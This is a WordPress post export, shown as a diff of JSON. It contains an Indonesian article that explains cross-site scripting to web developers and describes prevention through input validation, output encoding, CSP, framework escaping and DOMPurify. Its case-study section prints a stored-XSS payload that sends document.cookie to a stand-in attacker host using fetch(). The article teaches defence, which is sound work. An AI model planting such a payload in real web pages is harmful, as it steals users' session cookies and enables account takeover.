@@ -1,0 +1,313 @@
+{
+  "id": 4070,
+  "title": "XSS dalam Perspektif Keamanan Web Developer",
+  "slug": "xss-dalam-perspektif-keamanan-web-developer",
+  "url": "https://buletinsiber.com/xss-dalam-perspektif-keamanan-web-developer/",
+  "date": "2025-07-09T02:50:03",
+  "date_gmt": "2025-07-09T02:50:03",
+  "modified": "2025-07-09T02:50:03",
+  "modified_gmt": "2025-07-09T02:50:03",
+  "author": {
+    "id": 2,
+    "name": "public enemy"
+  },
+  "categories": [
+    {
+      "id": 6,
+      "name": "Tech"
+    }
+  ],
+  "tags": [
+    333
+  ],
+  "featured_image": "https://buletinsiber.com/wp-content/uploads/2025/07/keamanan_1.webp",
+  "excerpt": "Pendahuluan Cross Site Scripting atau yang biasa disingkat XSS adalah salah satu jenis serangan siber yang cukup sering menyerang aplikasi web. Banyak pengembang web yang masih belum memahami secara mendalam bagaimana XSS bekerja dan bagaimana mencegahnya. Padahal, jika tidak ditangani dengan baik, XSS bisa membahayakan pengguna dan merusak reputasi aplikasi. Artikel ini ditulis untuk membantu web developer memahami XSS dan cara mencegahnya dengan bahasa yang mudah dimengerti. Apa Itu XSS? XSS adalah jenis serangan di mana penyerang menyisipkan skrip berbahaya ke dalam halaman web yang akan dilihat oleh pengguna lain. Biasanya skrip tersebut berupa kode JavaScript yang akan dieksekusi di…",
+  "content_html": "<p data-start=\"135\" data-end=\"182\">\n<p data-start=\"184\" data-end=\"199\"><strong data-start=\"184\" data-end=\"199\">Pendahuluan</strong></p>\n<p data-start=\"201\" data-end=\"670\">Cross Site Scripting atau yang biasa disingkat XSS adalah salah satu jenis serangan siber yang cukup sering menyerang aplikasi web. Banyak pengembang web yang masih belum memahami secara mendalam bagaimana XSS bekerja dan bagaimana mencegahnya. Padahal, jika tidak ditangani dengan baik, XSS bisa membahayakan pengguna dan merusak reputasi aplikasi. Artikel ini ditulis untuk membantu web developer memahami XSS dan cara mencegahnya dengan bahasa yang mudah dimengerti.</p>\n<p data-start=\"672\" data-end=\"688\"><strong data-start=\"672\" data-end=\"688\">Apa Itu XSS?</strong></p>\n<p data-start=\"690\" data-end=\"1048\">XSS adalah jenis serangan di mana penyerang menyisipkan skrip berbahaya ke dalam halaman web yang akan dilihat oleh pengguna lain. Biasanya skrip tersebut berupa kode JavaScript yang akan dieksekusi di sisi pengguna (browser). Serangan ini dimanfaatkan untuk mencuri data pengguna, seperti cookie, data login, atau bahkan mengarahkan pengguna ke situs palsu.</p>\n<p data-start=\"1050\" data-end=\"1086\">Ada tiga jenis XSS yang paling umum:</p>\n<ol data-start=\"1088\" data-end=\"1395\">\n<li data-start=\"1088\" data-end=\"1181\">\n<p data-start=\"1091\" data-end=\"1181\">Stored XSS: Skrip berbahaya disimpan di server, seperti di kolom komentar atau form input.</p>\n</li>\n<li data-start=\"1182\" data-end=\"1277\">\n<p data-start=\"1185\" data-end=\"1277\">Reflected XSS: Skrip berbahaya langsung dikembalikan oleh server melalui URL atau parameter.</p>\n</li>\n<li data-start=\"1278\" data-end=\"1395\">\n<p data-start=\"1281\" data-end=\"1395\">DOM-based XSS: Terjadi di sisi klien, ketika manipulasi DOM menyebabkan eksekusi skrip tanpa pengaruh dari server.</p>\n</li>\n</ol>\n<p data-start=\"1397\" data-end=\"1604\">Contoh sederhana dari XSS adalah ketika pengguna memasukkan <code data-start=\"1457\" data-end=\"1489\">&lt;script&gt;alert(\"XSS!\")&lt;/script&gt;</code> ke kolom komentar, dan setiap orang yang membuka halaman tersebut akan melihat kotak pesan muncul secara otomatis.</p>\n<p data-start=\"1606\" data-end=\"1645\"><strong data-start=\"1606\" data-end=\"1645\">Mengapa XSS Menjadi Ancaman Serius?</strong></p>\n<p data-start=\"1647\" data-end=\"1895\">XSS sangat berbahaya karena bisa mengekspos informasi penting milik pengguna tanpa sepengetahuan mereka. Penyerang bisa mencuri cookie pengguna untuk mengambil alih akun, menyisipkan iklan palsu, atau menipu pengguna agar mengklik tautan berbahaya.</p>\n<p data-start=\"1897\" data-end=\"2152\">Banyak kasus besar yang terjadi akibat XSS, termasuk serangan pada situs-situs besar seperti eBay, Twitter, dan forum komunitas. Selain merugikan pengguna, serangan ini juga merusak kepercayaan pengguna terhadap layanan yang disediakan oleh web developer.</p>\n<p data-start=\"2154\" data-end=\"2206\"><strong data-start=\"2154\" data-end=\"2206\">Kesalahan Umum Web Developer dalam Menangani XSS</strong></p>\n<p data-start=\"2208\" data-end=\"2450\">Salah satu kesalahan paling umum adalah tidak melakukan validasi input dari pengguna. Banyak developer hanya fokus membuat aplikasi berjalan, tanpa memperhatikan bahwa semua input dari pengguna harus dianggap berbahaya sampai dibuktikan aman.</p>\n<p data-start=\"2452\" data-end=\"2716\">Kesalahan lain adalah tidak melakukan encoding atau sanitasi data sebelum ditampilkan kembali ke halaman web. Banyak yang juga masih menggunakan metode manipulasi DOM yang tidak aman seperti <code data-start=\"2643\" data-end=\"2654\">innerHTML</code> tanpa filter, yang dapat membuat halaman rentan terhadap XSS.</p>\n<p data-start=\"2718\" data-end=\"2771\"><strong data-start=\"2718\" data-end=\"2771\">Strategi Pencegahan XSS dari Perspektif Developer</strong></p>\n<p data-start=\"2773\" data-end=\"2849\">Untuk mencegah XSS, ada beberapa langkah yang bisa dilakukan oleh developer:</p>\n<ul data-start=\"2851\" data-end=\"3495\">\n<li data-start=\"2851\" data-end=\"2963\">\n<p data-start=\"2853\" data-end=\"2963\">Selalu validasi dan bersihkan data input pengguna. Jangan langsung percaya pada data dari form, URL, atau API.</p>\n</li>\n<li data-start=\"2964\" data-end=\"3095\">\n<p data-start=\"2966\" data-end=\"3095\">Gunakan encoding saat menampilkan data ke HTML, JavaScript, atau atribut URL. Ini mencegah karakter khusus berubah menjadi skrip.</p>\n</li>\n<li data-start=\"3096\" data-end=\"3222\">\n<p data-start=\"3098\" data-end=\"3222\">Terapkan Content Security Policy (CSP), yaitu kebijakan keamanan yang membatasi jenis konten yang boleh dimuat oleh browser.</p>\n</li>\n<li data-start=\"3223\" data-end=\"3361\">\n<p data-start=\"3225\" data-end=\"3361\">Gunakan framework modern seperti React, Angular, atau Vue yang secara default mencegah XSS dengan cara mengatur output HTML secara aman.</p>\n</li>\n<li data-start=\"3362\" data-end=\"3495\">\n<p data-start=\"3364\" data-end=\"3495\">Hindari menggunakan metode raw seperti <code data-start=\"3403\" data-end=\"3414\">innerHTML</code>, <code data-start=\"3416\" data-end=\"3424\">eval()</code>, atau <code data-start=\"3431\" data-end=\"3449\">document.write()</code> yang bisa dieksploitasi jika tidak hati-hati.</p>\n</li>\n</ul>\n<p data-start=\"3497\" data-end=\"3540\"><strong data-start=\"3497\" data-end=\"3540\">Tools dan Framework Pendukung Developer</strong></p>\n<p data-start=\"3542\" data-end=\"3826\">Untuk membantu mencegah XSS, ada banyak tools yang bisa digunakan. Contohnya adalah DOMPurify, sebuah library JavaScript yang bisa membersihkan konten HTML agar aman dari skrip berbahaya. Selain itu, OWASP juga menyediakan berbagai panduan dan tools untuk memeriksa keamanan aplikasi.</p>\n<p data-start=\"3828\" data-end=\"4057\">Framework modern seperti React dan Angular sudah menyediakan mekanisme built-in untuk melindungi dari XSS. Misalnya, React secara otomatis melakukan escaping pada semua output HTML kecuali jika kita sengaja mengaktifkan mode raw.</p>\n<p data-start=\"4059\" data-end=\"4202\">Beberapa tools seperti Burp Suite dan OWASP ZAP juga bisa digunakan untuk menguji keamanan aplikasi dari berbagai jenis serangan, termasuk XSS.</p>\n<p data-start=\"4204\" data-end=\"4227\"><strong data-start=\"4204\" data-end=\"4227\">Studi Kasus Singkat</strong></p>\n<p data-start=\"4229\" data-end=\"4677\">Bayangkan sebuah situs memiliki form komentar tanpa validasi. Seorang penyerang memasukkan kode <code data-start=\"4325\" data-end=\"4403\">&lt;script&gt;fetch('https://attacker.com/steal?cookie='+document.cookie)&lt;/script&gt;</code>. Kode tersebut akan dijalankan setiap kali pengguna lain membuka halaman tersebut, dan cookie mereka dikirim ke situs penyerang. Hal ini bisa dicegah jika developer melakukan escaping pada input sebelum ditampilkan, atau membersihkan input sebelum menyimpannya ke database.</p>\n<p data-start=\"4679\" data-end=\"4693\"><strong data-start=\"4679\" data-end=\"4693\">Kesimpulan</strong></p>\n<p data-start=\"4695\" data-end=\"5129\">Sebagai web developer, memahami dan mencegah XSS adalah bagian penting dari tanggung jawab kita terhadap keamanan pengguna. Serangan ini mungkin tampak sederhana, tapi dampaknya bisa sangat serius. Dengan menerapkan validasi input, output encoding, dan menggunakan tools yang tepat, kita bisa membuat aplikasi web yang jauh lebih aman. Keamanan bukanlah fitur tambahan, tapi fondasi penting dalam pengembangan aplikasi web yang andal.</p>\n<p data-start=\"4695\" data-end=\"5129\">NAMA: AISYA</p>\n<p data-start=\"4695\" data-end=\"5129\">NIM: 23156201029</p>\n<p data-start=\"4695\" data-end=\"5129\">PRODI: SISTEM KOMPUTER</p>\n",
+  "content_text": "Pendahuluan\nCross Site Scripting atau yang biasa disingkat XSS adalah salah satu jenis serangan siber yang cukup sering menyerang aplikasi web. Banyak pengembang web yang masih belum memahami secara mendalam bagaimana XSS bekerja dan bagaimana mencegahnya. Padahal, jika tidak ditangani dengan baik, XSS bisa membahayakan pengguna dan merusak reputasi aplikasi. Artikel ini ditulis untuk membantu web developer memahami XSS dan cara mencegahnya dengan bahasa yang mudah dimengerti.\nApa Itu XSS?\nXSS adalah jenis serangan di mana penyerang menyisipkan skrip berbahaya ke dalam halaman web yang akan dilihat oleh pengguna lain. Biasanya skrip tersebut berupa kode JavaScript yang akan dieksekusi di sisi pengguna (browser). Serangan ini dimanfaatkan untuk mencuri data pengguna, seperti cookie, data login, atau bahkan mengarahkan pengguna ke situs palsu.\nAda tiga jenis XSS yang paling umum:\nStored XSS: Skrip berbahaya disimpan di server, seperti di kolom komentar atau form input.\nReflected XSS: Skrip berbahaya langsung dikembalikan oleh server melalui URL atau parameter.\nDOM-based XSS: Terjadi di sisi klien, ketika manipulasi DOM menyebabkan eksekusi skrip tanpa pengaruh dari server.\nContoh sederhana dari XSS adalah ketika pengguna memasukkan  <script>alert(\"XSS!\")</script>  ke kolom komentar, dan setiap orang yang membuka halaman tersebut akan melihat kotak pesan muncul secara otomatis.\nMengapa XSS Menjadi Ancaman Serius?\nXSS sangat berbahaya karena bisa mengekspos informasi penting milik pengguna tanpa sepengetahuan mereka. Penyerang bisa mencuri cookie pengguna untuk mengambil alih akun, menyisipkan iklan palsu, atau menipu pengguna agar mengklik tautan berbahaya.\nBanyak kasus besar yang terjadi akibat XSS, termasuk serangan pada situs-situs besar seperti eBay, Twitter, dan forum komunitas. Selain merugikan pengguna, serangan ini juga merusak kepercayaan pengguna terhadap layanan yang disediakan oleh web developer.\nKesalahan Umum Web Developer dalam Menangani XSS\nSalah satu kesalahan paling umum adalah tidak melakukan validasi input dari pengguna. Banyak developer hanya fokus membuat aplikasi berjalan, tanpa memperhatikan bahwa semua input dari pengguna harus dianggap berbahaya sampai dibuktikan aman.\nKesalahan lain adalah tidak melakukan encoding atau sanitasi data sebelum ditampilkan kembali ke halaman web. Banyak yang juga masih menggunakan metode manipulasi DOM yang tidak aman seperti  innerHTML  tanpa filter, yang dapat membuat halaman rentan terhadap XSS.\nStrategi Pencegahan XSS dari Perspektif Developer\nUntuk mencegah XSS, ada beberapa langkah yang bisa dilakukan oleh developer:\nSelalu validasi dan bersihkan data input pengguna. Jangan langsung percaya pada data dari form, URL, atau API.\nGunakan encoding saat menampilkan data ke HTML, JavaScript, atau atribut URL. Ini mencegah karakter khusus berubah menjadi skrip.\nTerapkan Content Security Policy (CSP), yaitu kebijakan keamanan yang membatasi jenis konten yang boleh dimuat oleh browser.\nGunakan framework modern seperti React, Angular, atau Vue yang secara default mencegah XSS dengan cara mengatur output HTML secara aman.\nHindari menggunakan metode raw seperti  innerHTML ,  eval() , atau  document.write()  yang bisa dieksploitasi jika tidak hati-hati.\nTools dan Framework Pendukung Developer\nUntuk membantu mencegah XSS, ada banyak tools yang bisa digunakan. Contohnya adalah DOMPurify, sebuah library JavaScript yang bisa membersihkan konten HTML agar aman dari skrip berbahaya. Selain itu, OWASP juga menyediakan berbagai panduan dan tools untuk memeriksa keamanan aplikasi.\nFramework modern seperti React dan Angular sudah menyediakan mekanisme built-in untuk melindungi dari XSS. Misalnya, React secara otomatis melakukan escaping pada semua output HTML kecuali jika kita sengaja mengaktifkan mode raw.\nBeberapa tools seperti Burp Suite dan OWASP ZAP juga bisa digunakan untuk menguji keamanan aplikasi dari berbagai jenis serangan, termasuk XSS.\nStudi Kasus Singkat\nBayangkan sebuah situs memiliki form komentar tanpa validasi. Seorang penyerang memasukkan kode  <script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script> . Kode tersebut akan dijalankan setiap kali pengguna lain membuka halaman tersebut, dan cookie mereka dikirim ke situs penyerang. Hal ini bisa dicegah jika developer melakukan escaping pada input sebelum ditampilkan, atau membersihkan input sebelum menyimpannya ke database.\nKesimpulan\nSebagai web developer, memahami dan mencegah XSS adalah bagian penting dari tanggung jawab kita terhadap keamanan pengguna. Serangan ini mungkin tampak sederhana, tapi dampaknya bisa sangat serius. Dengan menerapkan validasi input, output encoding, dan menggunakan tools yang tepat, kita bisa membuat aplikasi web yang jauh lebih aman. Keamanan bukanlah fitur tambahan, tapi fondasi penting dalam pengembangan aplikasi web yang andal.\nNAMA: AISYA\nNIM: 23156201029\nPRODI: SISTEM KOMPUTER",
+  "raw": {
+    "id": 4070,
+    "date": "2025-07-09T02:50:03",
+    "date_gmt": "2025-07-09T02:50:03",
+    "guid": {
+      "rendered": "https://buletinsiber.com/?p=4070"
+    },
+    "modified": "2025-07-09T02:50:03",
+    "modified_gmt": "2025-07-09T02:50:03",
+    "slug": "xss-dalam-perspektif-keamanan-web-developer",
+    "status": "publish",
+    "type": "post",
+    "link": "https://buletinsiber.com/xss-dalam-perspektif-keamanan-web-developer/",
+    "title": {
+      "rendered": "XSS dalam Perspektif Keamanan Web Developer"
+    },
+    "content": {
+      "rendered": "<p data-start=\"135\" data-end=\"182\">\n<p data-start=\"184\" data-end=\"199\"><strong data-start=\"184\" data-end=\"199\">Pendahuluan</strong></p>\n<p data-start=\"201\" data-end=\"670\">Cross Site Scripting atau yang biasa disingkat XSS adalah salah satu jenis serangan siber yang cukup sering menyerang aplikasi web. Banyak pengembang web yang masih belum memahami secara mendalam bagaimana XSS bekerja dan bagaimana mencegahnya. Padahal, jika tidak ditangani dengan baik, XSS bisa membahayakan pengguna dan merusak reputasi aplikasi. Artikel ini ditulis untuk membantu web developer memahami XSS dan cara mencegahnya dengan bahasa yang mudah dimengerti.</p>\n<p data-start=\"672\" data-end=\"688\"><strong data-start=\"672\" data-end=\"688\">Apa Itu XSS?</strong></p>\n<p data-start=\"690\" data-end=\"1048\">XSS adalah jenis serangan di mana penyerang menyisipkan skrip berbahaya ke dalam halaman web yang akan dilihat oleh pengguna lain. Biasanya skrip tersebut berupa kode JavaScript yang akan dieksekusi di sisi pengguna (browser). Serangan ini dimanfaatkan untuk mencuri data pengguna, seperti cookie, data login, atau bahkan mengarahkan pengguna ke situs palsu.</p>\n<p data-start=\"1050\" data-end=\"1086\">Ada tiga jenis XSS yang paling umum:</p>\n<ol data-start=\"1088\" data-end=\"1395\">\n<li data-start=\"1088\" data-end=\"1181\">\n<p data-start=\"1091\" data-end=\"1181\">Stored XSS: Skrip berbahaya disimpan di server, seperti di kolom komentar atau form input.</p>\n</li>\n<li data-start=\"1182\" data-end=\"1277\">\n<p data-start=\"1185\" data-end=\"1277\">Reflected XSS: Skrip berbahaya langsung dikembalikan oleh server melalui URL atau parameter.</p>\n</li>\n<li data-start=\"1278\" data-end=\"1395\">\n<p data-start=\"1281\" data-end=\"1395\">DOM-based XSS: Terjadi di sisi klien, ketika manipulasi DOM menyebabkan eksekusi skrip tanpa pengaruh dari server.</p>\n</li>\n</ol>\n<p data-start=\"1397\" data-end=\"1604\">Contoh sederhana dari XSS adalah ketika pengguna memasukkan <code data-start=\"1457\" data-end=\"1489\">&lt;script&gt;alert(\"XSS!\")&lt;/script&gt;</code> ke kolom komentar, dan setiap orang yang membuka halaman tersebut akan melihat kotak pesan muncul secara otomatis.</p>\n<p data-start=\"1606\" data-end=\"1645\"><strong data-start=\"1606\" data-end=\"1645\">Mengapa XSS Menjadi Ancaman Serius?</strong></p>\n<p data-start=\"1647\" data-end=\"1895\">XSS sangat berbahaya karena bisa mengekspos informasi penting milik pengguna tanpa sepengetahuan mereka. Penyerang bisa mencuri cookie pengguna untuk mengambil alih akun, menyisipkan iklan palsu, atau menipu pengguna agar mengklik tautan berbahaya.</p>\n<p data-start=\"1897\" data-end=\"2152\">Banyak kasus besar yang terjadi akibat XSS, termasuk serangan pada situs-situs besar seperti eBay, Twitter, dan forum komunitas. Selain merugikan pengguna, serangan ini juga merusak kepercayaan pengguna terhadap layanan yang disediakan oleh web developer.</p>\n<p data-start=\"2154\" data-end=\"2206\"><strong data-start=\"2154\" data-end=\"2206\">Kesalahan Umum Web Developer dalam Menangani XSS</strong></p>\n<p data-start=\"2208\" data-end=\"2450\">Salah satu kesalahan paling umum adalah tidak melakukan validasi input dari pengguna. Banyak developer hanya fokus membuat aplikasi berjalan, tanpa memperhatikan bahwa semua input dari pengguna harus dianggap berbahaya sampai dibuktikan aman.</p>\n<p data-start=\"2452\" data-end=\"2716\">Kesalahan lain adalah tidak melakukan encoding atau sanitasi data sebelum ditampilkan kembali ke halaman web. Banyak yang juga masih menggunakan metode manipulasi DOM yang tidak aman seperti <code data-start=\"2643\" data-end=\"2654\">innerHTML</code> tanpa filter, yang dapat membuat halaman rentan terhadap XSS.</p>\n<p data-start=\"2718\" data-end=\"2771\"><strong data-start=\"2718\" data-end=\"2771\">Strategi Pencegahan XSS dari Perspektif Developer</strong></p>\n<p data-start=\"2773\" data-end=\"2849\">Untuk mencegah XSS, ada beberapa langkah yang bisa dilakukan oleh developer:</p>\n<ul data-start=\"2851\" data-end=\"3495\">\n<li data-start=\"2851\" data-end=\"2963\">\n<p data-start=\"2853\" data-end=\"2963\">Selalu validasi dan bersihkan data input pengguna. Jangan langsung percaya pada data dari form, URL, atau API.</p>\n</li>\n<li data-start=\"2964\" data-end=\"3095\">\n<p data-start=\"2966\" data-end=\"3095\">Gunakan encoding saat menampilkan data ke HTML, JavaScript, atau atribut URL. Ini mencegah karakter khusus berubah menjadi skrip.</p>\n</li>\n<li data-start=\"3096\" data-end=\"3222\">\n<p data-start=\"3098\" data-end=\"3222\">Terapkan Content Security Policy (CSP), yaitu kebijakan keamanan yang membatasi jenis konten yang boleh dimuat oleh browser.</p>\n</li>\n<li data-start=\"3223\" data-end=\"3361\">\n<p data-start=\"3225\" data-end=\"3361\">Gunakan framework modern seperti React, Angular, atau Vue yang secara default mencegah XSS dengan cara mengatur output HTML secara aman.</p>\n</li>\n<li data-start=\"3362\" data-end=\"3495\">\n<p data-start=\"3364\" data-end=\"3495\">Hindari menggunakan metode raw seperti <code data-start=\"3403\" data-end=\"3414\">innerHTML</code>, <code data-start=\"3416\" data-end=\"3424\">eval()</code>, atau <code data-start=\"3431\" data-end=\"3449\">document.write()</code> yang bisa dieksploitasi jika tidak hati-hati.</p>\n</li>\n</ul>\n<p data-start=\"3497\" data-end=\"3540\"><strong data-start=\"3497\" data-end=\"3540\">Tools dan Framework Pendukung Developer</strong></p>\n<p data-start=\"3542\" data-end=\"3826\">Untuk membantu mencegah XSS, ada banyak tools yang bisa digunakan. Contohnya adalah DOMPurify, sebuah library JavaScript yang bisa membersihkan konten HTML agar aman dari skrip berbahaya. Selain itu, OWASP juga menyediakan berbagai panduan dan tools untuk memeriksa keamanan aplikasi.</p>\n<p data-start=\"3828\" data-end=\"4057\">Framework modern seperti React dan Angular sudah menyediakan mekanisme built-in untuk melindungi dari XSS. Misalnya, React secara otomatis melakukan escaping pada semua output HTML kecuali jika kita sengaja mengaktifkan mode raw.</p>\n<p data-start=\"4059\" data-end=\"4202\">Beberapa tools seperti Burp Suite dan OWASP ZAP juga bisa digunakan untuk menguji keamanan aplikasi dari berbagai jenis serangan, termasuk XSS.</p>\n<p data-start=\"4204\" data-end=\"4227\"><strong data-start=\"4204\" data-end=\"4227\">Studi Kasus Singkat</strong></p>\n<p data-start=\"4229\" data-end=\"4677\">Bayangkan sebuah situs memiliki form komentar tanpa validasi. Seorang penyerang memasukkan kode <code data-start=\"4325\" data-end=\"4403\">&lt;script&gt;fetch('https://attacker.com/steal?cookie='+document.cookie)&lt;/script&gt;</code>. Kode tersebut akan dijalankan setiap kali pengguna lain membuka halaman tersebut, dan cookie mereka dikirim ke situs penyerang. Hal ini bisa dicegah jika developer melakukan escaping pada input sebelum ditampilkan, atau membersihkan input sebelum menyimpannya ke database.</p>\n<p data-start=\"4679\" data-end=\"4693\"><strong data-start=\"4679\" data-end=\"4693\">Kesimpulan</strong></p>\n<p data-start=\"4695\" data-end=\"5129\">Sebagai web developer, memahami dan mencegah XSS adalah bagian penting dari tanggung jawab kita terhadap keamanan pengguna. Serangan ini mungkin tampak sederhana, tapi dampaknya bisa sangat serius. Dengan menerapkan validasi input, output encoding, dan menggunakan tools yang tepat, kita bisa membuat aplikasi web yang jauh lebih aman. Keamanan bukanlah fitur tambahan, tapi fondasi penting dalam pengembangan aplikasi web yang andal.</p>\n<p data-start=\"4695\" data-end=\"5129\">NAMA: AISYA</p>\n<p data-start=\"4695\" data-end=\"5129\">NIM: 23156201029</p>\n<p data-start=\"4695\" data-end=\"5129\">PRODI: SISTEM KOMPUTER</p>\n",
+      "protected": false
+    },
+    "excerpt": {
+      "rendered": "<p>Pendahuluan Cross Site Scripting atau yang biasa disingkat XSS adalah salah satu jenis serangan siber yang cukup sering menyerang aplikasi web. Banyak pengembang web yang masih belum memahami secara mendalam bagaimana XSS bekerja dan bagaimana mencegahnya. Padahal, jika tidak ditangani dengan baik, XSS bisa membahayakan pengguna dan merusak reputasi aplikasi. Artikel ini ditulis untuk membantu web developer memahami XSS dan cara mencegahnya dengan bahasa yang mudah dimengerti. Apa Itu XSS? XSS adalah jenis serangan di mana penyerang menyisipkan skrip berbahaya ke dalam halaman web yang akan dilihat oleh pengguna lain. Biasanya skrip tersebut berupa kode JavaScript yang akan dieksekusi di&#8230;</p>\n",
+      "protected": false
+    },
+    "author": 2,
+    "featured_media": 4071,
+    "comment_status": "open",
+    "ping_status": "open",
+    "sticky": false,
+    "template": "",
+    "format": "standard",
+    "meta": {
+      "_acf_changed": false,
+      "_yoast_wpseo_focuskw": "",
+      "_yoast_wpseo_title": "",
+      "_yoast_wpseo_metadesc": "",
+      "footnotes": "",
+      "rank_math_title": "",
+      "rank_math_description": "",
+      "rank_math_focus_keyword": "",
+      "_aioseop_title": "",
+      "_aioseop_description": "",
+      "jetpack_publicize_message": "",
+      "jetpack_publicize_feature_enabled": true,
+      "jetpack_social_post_already_shared": false,
+      "jetpack_social_options": {
+        "image_generator_settings": {
+          "template": "highway",
+          "default_image_id": 0,
+          "font": "",
+          "enabled": false
+        },
+        "version": 2
+      }
+    },
+    "categories": [
+      6
+    ],
+    "tags": [
+      333
+    ],
+    "class_list": [
+      "post-4070",
+      "post",
+      "type-post",
+      "status-publish",
+      "format-standard",
+      "has-post-thumbnail",
+      "hentry",
+      "category-tech",
+      "tag-artikel"
+    ],
+    "acf": [],
+    "yoast_head": "<!-- This site is optimized with the Yoast SEO plugin v24.0 - https://yoast.com/wordpress/plugins/seo/ -->\n<title>XSS dalam Perspektif Keamanan Web Developer - buletinsiber.com</title>\n<meta name=\"robots\" content=\"index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1\" />\n<link rel=\"canonical\" href=\"https://buletinsiber.com/xss-dalam-perspektif-keamanan-web-developer/\" />\n<meta property=\"og:locale\" content=\"en_US\" />\n<meta property=\"og:type\" content=\"article\" />\n<meta property=\"og:title\" content=\"XSS dalam Perspektif Keamanan Web Developer - buletinsiber.com\" />\n<meta property=\"og:description\" content=\"Pendahuluan Cross Site Scripting atau yang biasa disingkat XSS adalah salah satu jenis serangan siber yang cukup sering menyerang aplikasi web. Banyak pengembang web yang masih belum memahami secara mendalam bagaimana XSS bekerja dan bagaimana mencegahnya. Padahal, jika tidak ditangani dengan baik, XSS bisa membahayakan pengguna dan merusak reputasi aplikasi. Artikel ini ditulis untuk membantu web developer memahami XSS dan cara mencegahnya dengan bahasa yang mudah dimengerti. Apa Itu XSS? XSS adalah jenis serangan di mana penyerang menyisipkan skrip berbahaya ke dalam halaman web yang akan dilihat oleh pengguna lain. Biasanya skrip tersebut berupa kode JavaScript yang akan dieksekusi di...\" />\n<meta property=\"og:url\" content=\"https://buletinsiber.com/xss-dalam-perspektif-keamanan-web-developer/\" />\n<meta property=\"og:site_name\" content=\"buletinsiber.com\" />\n<meta property=\"article:publisher\" content=\"https://www.facebook.com/publiksultra/\" />\n<meta property=\"article:published_time\" content=\"2025-07-09T02:50:03+00:00\" />\n<meta property=\"og:image\" content=\"https://buletinsiber.com/wp-content/uploads/2025/07/keamanan_1.webp\" />\n\t<meta property=\"og:image:width\" content=\"1200\" />\n\t<meta property=\"og:image:height\" content=\"675\" />\n\t<meta property=\"og:image:type\" content=\"image/webp\" />\n<meta name=\"author\" content=\"public enemy\" />\n<meta name=\"twitter:card\" content=\"summary_large_image\" />\n<meta name=\"twitter:label1\" content=\"Written by\" />\n\t<meta name=\"twitter:data1\" content=\"public enemy\" />\n\t<meta name=\"twitter:label2\" content=\"Est. reading time\" />\n\t<meta name=\"twitter:data2\" content=\"4 minutes\" />\n<script type=\"application/ld+json\" class=\"yoast-schema-graph\">{\"@context\":\"https://schema.org\",\"@graph\":[{\"@type\":\"WebPage\",\"@id\":\"https://buletinsiber.com/xss-dalam-perspektif-keamanan-web-developer/\",\"url\":\"https://buletinsiber.com/xss-dalam-perspektif-keamanan-web-developer/\",\"name\":\"XSS dalam Perspektif Keamanan Web Developer - buletinsiber.com\",\"isPartOf\":{\"@id\":\"https://buletinsiber.com/#website\"},\"primaryImageOfPage\":{\"@id\":\"https://buletinsiber.com/xss-dalam-perspektif-keamanan-web-developer/#primaryimage\"},\"image\":{\"@id\":\"https://buletinsiber.com/xss-dalam-perspektif-keamanan-web-developer/#primaryimage\"},\"thumbnailUrl\":\"https://buletinsiber.com/wp-content/uploads/2025/07/keamanan_1.webp\",\"datePublished\":\"2025-07-09T02:50:03+00:00\",\"dateModified\":\"2025-07-09T02:50:03+00:00\",\"author\":{\"@id\":\"https://buletinsiber.com/#/schema/person/f5a8529dcfc055c262c6563c6522fb91\"},\"breadcrumb\":{\"@id\":\"https://buletinsiber.com/xss-dalam-perspektif-keamanan-web-developer/#breadcrumb\"},\"inLanguage\":\"en-US\",\"potentialAction\":[{\"@type\":\"ReadAction\",\"target\":[\"https://buletinsiber.com/xss-dalam-perspektif-keamanan-web-developer/\"]}]},{\"@type\":\"ImageObject\",\"inLanguage\":\"en-US\",\"@id\":\"https://buletinsiber.com/xss-dalam-perspektif-keamanan-web-developer/#primaryimage\",\"url\":\"https://buletinsiber.com/wp-content/uploads/2025/07/keamanan_1.webp\",\"contentUrl\":\"https://buletinsiber.com/wp-content/uploads/2025/07/keamanan_1.webp\",\"width\":1200,\"height\":675},{\"@type\":\"BreadcrumbList\",\"@id\":\"https://buletinsiber.com/xss-dalam-perspektif-keamanan-web-developer/#breadcrumb\",\"itemListElement\":[{\"@type\":\"ListItem\",\"position\":1,\"name\":\"Home\",\"item\":\"https://buletinsiber.com/\"},{\"@type\":\"ListItem\",\"position\":2,\"name\":\"XSS dalam Perspektif Keamanan Web Developer\"}]},{\"@type\":\"WebSite\",\"@id\":\"https://buletinsiber.com/#website\",\"url\":\"https://buletinsiber.com/\",\"name\":\"buletinsiber.com\",\"description\":\"sumber berita terupdate seputar keamanan siber dan teknologi terkini\",\"alternateName\":\"buletin siber\",\"potentialAction\":[{\"@type\":\"SearchAction\",\"target\":{\"@type\":\"EntryPoint\",\"urlTemplate\":\"https://buletinsiber.com/?s={search_term_string}\"},\"query-input\":{\"@type\":\"PropertyValueSpecification\",\"valueRequired\":true,\"valueName\":\"search_term_string\"}}],\"inLanguage\":\"en-US\"},{\"@type\":\"Person\",\"@id\":\"https://buletinsiber.com/#/schema/person/f5a8529dcfc055c262c6563c6522fb91\",\"name\":\"public enemy\",\"image\":{\"@type\":\"ImageObject\",\"inLanguage\":\"en-US\",\"@id\":\"https://buletinsiber.com/#/schema/person/image/\",\"url\":\"https://secure.gravatar.com/avatar/af7771d86188d142ee0d8c9c8feb4fdb5d463ff8959448100bf47ad25c3052c8?s=96&d=mm&r=g\",\"contentUrl\":\"https://secure.gravatar.com/avatar/af7771d86188d142ee0d8c9c8feb4fdb5d463ff8959448100bf47ad25c3052c8?s=96&d=mm&r=g\",\"caption\":\"public enemy\"},\"url\":\"https://buletinsiber.com/author/public_enemy/\"}]}</script>\n<!-- / Yoast SEO plugin. -->",
+    "yoast_head_json": {
+      "title": "XSS dalam Perspektif Keamanan Web Developer - buletinsiber.com",
+      "robots": {
+        "index": "index",
+        "follow": "follow",
+        "max-snippet": "max-snippet:-1",
+        "max-image-preview": "max-image-preview:large",
+        "max-video-preview": "max-video-preview:-1"
+      },
+      "canonical": "https://buletinsiber.com/xss-dalam-perspektif-keamanan-web-developer/",
+      "og_locale": "en_US",
+      "og_type": "article",
+      "og_title": "XSS dalam Perspektif Keamanan Web Developer - buletinsiber.com",
